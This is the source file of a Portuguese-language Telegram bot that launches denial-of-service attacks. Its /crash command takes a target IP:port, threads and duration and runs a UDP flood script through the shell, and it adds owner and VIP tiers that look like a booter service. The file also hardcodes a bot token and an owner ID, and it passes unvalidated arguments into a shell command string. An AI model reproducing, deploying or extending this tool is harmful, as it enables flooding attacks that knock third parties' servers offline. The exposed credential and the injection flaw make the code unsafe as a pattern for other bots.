# -*- coding: utf-8 -*-
import telebot
import subprocess
import re
import time
from threading import Thread

# Configura��es do bot
BOT_TOKEN = "7972626459:AAGjV9QjaDRfEYXOO-X4TgXoWo2MqQbwMz8"
SEU_ID_TELEGRAM = 6430703027
bot = telebot.TeleBot(BOT_TOKEN)

# Listas de controle
processos = {}
authorized_users = [SEU_ID_TELEGRAM]
vip_users = []
vip_commands = []
MAX_ATTACKS = 3

# Fun��o para validar IP:PORT
def validar_ip_porta(ip_porta):
    padrao = r'^\d{1,3}(\.\d{1,3}){3}:\d+$'
    return re.match(padrao, ip_porta) is not None

# Fun��o para gerenciar ataques
def executar_comando(ip_porta, threads, tempo):
    comando_terminal = f"python3 start.py UDP {ip_porta} {threads} {tempo}"
    try:
        processo = subprocess.Popen(
            comando_terminal,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        processos[ip_porta] = processo
        time.sleep(int(tempo))
        processo.terminate()
        del processos[ip_porta]
    except Exception as e:
        print(f"Erro ao executar o comando: {str(e)}")

def manage_attacks():
    if len(processos) >= MAX_ATTACKS:
        oldest_process = list(processos.values())[0]
        oldest_process.terminate()
        del processos[list(processos.keys())[0]]

# Comando /start
@bot.message_handler(commands=['start'])
def start_message(message):
    welcome_text = (
        " Bem-vindo ao bot!\n\n"
        "Aqui est�o os comandos dispon�veis para voc�:\n\n"
        "Comandos b�sicos:\n"
        "/crash <IP:PORTA> [threads] [tempo] - Envia um ataque ao IP especificado.\n"
        "/meuid - Mostra seu ID de usu�rio.\n\n"
        "Comandos para usu�rios autorizados e VIPs:\n"
        "/adduser <ID> - Adiciona um usu�rio autorizado.\n"
        "/removeuser <ID> - Remove um usu�rio autorizado.\n"
        "/promovervip <ID> - Promove um usu�rio a VIP. (Somente o dono pode)\n"
        "/rebaixarvip <ID> - Remove o status de VIP de um usu�rio. (Somente o dono pode)\n\n"
        "Comandos exclusivos do dono do bot:\n"
        "/addcomandovip <comando> - Restringe um comando para VIPs.\n"
        "/revcomandovip <comando> - Remove a restri��o de comando VIP.\n\n"
        "Entre em contato se precisar de ajuda! "
    )
    bot.send_message(message.chat.id, welcome_text)

# Comando /crash
@bot.message_handler(commands=['crash'])
def crash_server(message):
    user_id = message.from_user.id
    if '/crash' in vip_commands and user_id not in vip_users and user_id != SEU_ID_TELEGRAM:
        bot.send_message(message.chat.id, " Este comando est� dispon�vel apenas para usu�rios VIP.")
        return

    try:
        args = message.text.split()
        if len(args) < 2:
            bot.send_message(message.chat.id, "Uso correto: /crash <IP:PORTA> [threads] [tempo]")
            return

        ip_porta = args[1]
        threads = args[2] if len(args) > 2 else "10"
        tempo = args[3] if len(args) > 3 else "900"

        if not validar_ip_porta(ip_porta):
            bot.send_message(message.chat.id, " Formato inv�lido de IP:PORTA.")
            return

        manage_attacks()
        bot.send_message(message.chat.id, f" Ataque iniciado para {ip_porta} com {threads} threads por {tempo} segundos.")
        thread = Thread(target=executar_comando, args=(ip_porta, threads, tempo))
        thread.start()
    except Exception as e:
        bot.send_message(message.chat.id, f"Erro: {str(e)}")

# Comando /meuid
@bot.message_handler(commands=['meuid'])
def send_user_id(message):
    bot.send_message(message.chat.id, f" Seu ID de usu�rio �: {message.from_user.id}")

# Comando /adduser
@bot.message_handler(commands=['adduser'])
def add_user(message):
    if message.from_user.id != SEU_ID_TELEGRAM:
        bot.send_message(message.chat.id, " Apenas o dono pode adicionar usu�rios.")
        return

    try:
        user_id = int(message.text.split()[1])
        if user_id not in authorized_users:
            authorized_users.append(user_id)
            bot.send_message(message.chat.id, f" Usu�rio {user_id} foi autorizado.")
        else:
            bot.send_message(message.chat.id, " Usu�rio j� est� autorizado.")
    except Exception:
        bot.send_message(message.chat.id, "Uso correto: /adduser <ID>")

# Comando /removeuser
@bot.message_handler(commands=['removeuser'])
def remove_user(message):
    if message.from_user.id != SEU_ID_TELEGRAM:
        bot.send_message(message.chat.id, " Apenas o dono pode remover usu�rios.")
        return

    try:
        user_id = int(message.text.split()[1])
        if user_id in authorized_users:
            authorized_users.remove(user_id)
            bot.send_message(message.chat.id, f" Usu�rio {user_id} foi removido.")
        else:
            bot.send_message(message.chat.id, " Usu�rio n�o est� autorizado.")
    except Exception:
        bot.send_message(message.chat.id, "Uso correto: /removeuser <ID>")

# Comando /promovervip
@bot.message_handler(commands=['promovervip'])
def promover_vip(message):
    if message.from_user.id != SEU_ID_TELEGRAM:
        bot.send_message(message.chat.id, " Apenas o dono pode promover usu�rios a VIP.")
        return

    try:
        user_id = int(message.text.split()[1])
        if user_id not in vip_users:
            vip_users.append(user_id)
            bot.send_message(message.chat.id, f" Usu�rio {user_id} foi promovido a VIP.")
        else:
            bot.send_message(message.chat.id, " Usu�rio j� � VIP.")
    except Exception:
        bot.send_message(message.chat.id, "Uso correto: /promovervip <ID>")

# Comando /rebaixarvip
@bot.message_handler(commands=['rebaixarvip'])
def rebaixar_vip(message):
    if message.from_user.id != SEU_ID_TELEGRAM:
        bot.send_message(message.chat.id, " Apenas o dono pode rebaixar usu�rios VIP.")
        return

    try:
        user_id = int(message.text.split()[1])
        if user_id in vip_users:
            vip_users.remove(user_id)
            bot.send_message(message.chat.id, f" Usu�rio {user_id} foi rebaixado de VIP.")
        else:
            bot.send_message(message.chat.id, " Usu�rio n�o � VIP.")
    except Exception:
        bot.send_message(message.chat.id, "Uso correto: /rebaixarvip <ID>")

# Comando /addcomandovip
@bot.message_handler(commands=['addcomandovip'])
def add_command_vip(message):
    if message.from_user.id != SEU_ID_TELEGRAM:
        bot.send_message(message.chat.id, " Apenas o dono pode adicionar comandos VIP.")
        return

    comando = message.text.split()[1].lower()
    if comando not in vip_commands:
        vip_commands.append(comando)
        bot.send_message(message.chat.id, f" Comando '{comando}' foi adicionado como VIP.")
    else:
        bot.send_message(message.chat.id, f" Comando '{comando}' j� � VIP.")

# Comando /revcomandovip
@bot.message_handler(commands=['revcomandovip'])
def remove_command_vip(message):
    if message.from_user.id != SEU_ID_TELEGRAM:
        bot.send_message(message.chat.id, " Apenas o dono pode remover comandos VIP.")
        return

    comando = message.text.split()[1].lower()
    if comando in vip_commands:
        vip_commands.remove(comando)
        bot.send_message(message.chat.id, f" Comando '{comando}' foi removido da lista VIP.")
    else:
        bot.send_message(message.chat.id, f" Comando '{comando}' n�o est� na lista VIP.")

# Manter o bot ativo
def keep_alive():
    while True:
        try:
            bot.polling(timeout=60)
        except Exception as e:
            print(f"Erro: {e}")
            time.sleep(15)

if __name__ == "__main__":
    keep_alive()